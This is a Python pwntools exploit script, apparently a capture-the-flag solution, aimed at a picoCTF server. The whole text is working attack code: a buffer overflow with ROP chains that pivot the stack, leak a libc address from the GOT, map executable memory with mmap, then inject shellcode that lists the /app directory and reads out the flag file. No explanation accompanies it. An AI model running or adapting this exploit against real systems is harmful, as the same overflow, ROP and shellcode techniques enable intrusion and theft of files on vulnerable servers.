from pwn import *

context.arch='amd64'

HOST, PORT = 'mars.picoctf.net', 31809
r = remote(HOST, PORT)

str = 0x00400c28
bss = 0x602000

pop_rdi = 0x400c03
pop_rsi_r15 = 0x400c01
pop_rsp_r13_r14_r15 = 0x400bfd

strlen_plt = 0x400760
read_plt = 0x400790

payload = flat([
    b'A' * 40,
    p64(pop_rdi) + p64(str),
    p64(strlen_plt),
    p64(pop_rdi) + p64(0),
    p64(pop_rsi_r15) + p64(bss) + p64(0),
    p64(read_plt),
    p64(pop_rsp_r13_r14_r15) + p64(bss)
])

r.send(payload)

r.recvuntil("/     /   ")
r.recvline()

write_plt = 0x400740
read_got = 0x601fd8
write_got = 0x601fb0

payload = flat([
    b'A' * 24,
    p64(pop_rdi) + p64(1),
    p64(pop_rsi_r15) + p64(read_got) + p64(0),
    p64(write_plt),
    p64(pop_rdi) + p64(0),
    p64(pop_rsi_r15) + p64(bss + 200) + p64(0),
    p64(read_plt),
    p64(pop_rsp_r13_r14_r15) + p64(bss + 200)
])

r.send(payload)

libc_read = u64(r.recv(8))
libc = libc_read - 0x111130
libc_mmap = libc + 0x11ba20

pop_rdx_r12 = libc + 0x11c371
pop_rcx = libc + 0x9f822
xor_r9d_r9d = libc + 0xc9ccf

payload = flat([
    b'A' * 24,
    p64(pop_rdi) + p64(0x11111),
    p64(pop_rsi_r15) + p64(0x100000) + p64(0),
    p64(pop_rdx_r12) + p64(0x7) + p64(0),
    p64(pop_rcx) + p64(0x22),
    p64(xor_r9d_r9d),
    p64(libc_mmap),
    p64(pop_rdi) + p64(0),
    p64(pop_rsi_r15) + p64(0x11111) + p64(0),
    p64(pop_rdx_r12) + p64(0xfffffffff) + p64(0),
    p64(read_plt),
    p64(0x11111)
])

r.sendline(payload)

sh = asm('''
    mov rax, 0x2f7070612f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    xor rax, rax
    mov rax, 217
    mov rsi, 0x22222
    mov rdx, 0x1000
    syscall

    xor rax, rax
    mov rdi, 1
    mov rsi, 0x22222
    mov rdx, 0x1000
    mov rax, 1
    syscall

    xor rax, rax
    mov rdi, 0
    mov rsi, 0x11111+0x1000
    mov rdx, 0x1000
    mov rax, 0
    syscall
''')

r.send(sh.ljust(0x1000, b'\x90'))
r.recvuntil('flag')
flag = 'flag' + r.recvuntil('.txt').strip().decode()
flag_path = '/app/' + flag
flag_path = flag_path.encode()[::-1].hex()

sh = f'''
    mov rax, 0x{flag_path[:4]}
    push rax
'''
for i in range(4, len(flag_path), 16):
    sh += f'''
    mov rax, 0x{flag_path[i:i+16]}
    push rax
    '''

sh = asm(sh)
sh += asm('''
    mov rdi, rsp
    xor rax, rax
    mov rax, 2
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov r8, rax
    xor rax, rax
    mov rdi, 0x33333
    mov rsi, 0x100
    mov rdx, 1
    mov r10, 2
    mov r9, 0
    mov rax, 9
    syscall

    mov rsi, rax
    xor rax, rax
    mov rax, 1
    mov rdi, 1
    mov rdx, 0x100
    syscall
''')

r.recv(0x1000)
r.sendline(sh)

r.interactive()